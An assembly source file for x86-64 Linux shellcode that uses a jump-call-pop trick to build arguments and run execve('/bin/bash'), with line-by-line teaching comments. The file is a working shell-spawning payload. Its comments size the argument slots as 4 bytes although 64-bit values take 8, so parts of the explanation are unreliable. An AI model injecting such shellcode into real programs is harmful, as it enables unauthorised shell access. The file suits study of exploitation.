; .text is not writeable, using "Section .text" will segfault
; https://stackoverflow.com/questions/24515720/how-to-disable-data-execution-prventiondep-in-ubuntu-to-execute-shellcode
Section .mytext progbits alloc exec write align=16
	global _start

_start:
	jmp short GotoCall

shellcode:
	; pop r10 will move the address of '/bin/bash122223333' to r10
	pop r10
	; xor rax, rax zeroes out rax
	xor rax, rax
	; r10 + 9 refers to the memory location storing the '1' (remember that the first '/' is index 0; 1 is index 9)
	; this will move a null byte there instead
	mov [r10 + 9], al
	; loads the address of r10 (a pointer to the string) into the first argument register, rdi
	lea rdi, [r10]
	; move a pointer to the top of the array into the second register
	mov [r10 + 10], rdi
	; move null bytes into the '3333' space to act as the nulls in the array ["/bin/bash", NULL] 
	;	-- remember "/bin/bash" is a POINTER to the string /bin/bash
	mov [r10 + 14], rax
	; place the execve syscall number into al
	mov al, 59
	; place the arguments into the registers then syscall
	mov rdi, r10
	lea rsi, [r10 + 10]
	lea rdx, [r10 + 14]
	syscall

GotoCall:
	Call shellcode
	; this pushes all of this onto the stack
	; we push the string /bin/bash onto the stack
	; 1 will be turned into a null byte`
	; 2 will be the pointer to the string /bin/bash
	; 3 will be the nulls that correpsond to the second item in the array for
	;	execve("/bin/bash", ["/bin/bash", NULL], NULL)
	; a null will be placed in the rdx register directly for the third arg
	db '/bin/bash122223333'